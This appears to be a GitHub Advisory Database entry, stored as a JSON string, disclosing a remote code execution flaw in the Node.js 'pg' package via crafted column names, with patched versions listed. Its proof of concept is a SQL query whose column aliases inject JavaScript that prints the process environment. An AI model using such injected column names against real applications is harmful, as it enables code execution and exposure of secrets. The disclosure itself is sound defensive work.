        "GitHub_Advisory_Database": "Affected versions of `pg` contain a remote code execution vulnerability that occurs when the remote database or query specifies a crafted column name. \n\nThere are two specific scenarios in which it is likely for an application to be vulnerable:\n1. The application executes unsafe, user-supplied sql which contains malicious column names.\n2. The application connects to an untrusted database and executes a query returning results which contain a malicious column name.\n\n## Proof of Concept\n```\nconst { Client } = require('pg')\nconst client = new Client()\nclient.connect()\n\nconst sql = `SELECT 1 AS \"\\\\'/*\", 2 AS \"\\\\'*/\\n + console.log(process.env)] = null;\\n//\"`\n\nclient.query(sql, (err, res) => {\n  client.end()\n})\n```\n\n\n## Recommendation\n\n* Version 2.x.x: Update to version 2.11.2 or later.\n* Version 3.x.x: Update to version 3.6.4 or later.\n* Version 4.x.x: Update to version 4.5.7 or later.\n* Version 5.x.x: Update to version 5.2.1 or later.\n* Version 6.x.x: Update to version 6.4.2 or later. ( Note that versions 6.1.6, 6.2.5, and 6.3.3 are also patched. )\n* Version 7.x.x: Update to version 7.1.2 or later. ( Note that version 7.0.2 is also patched. )"
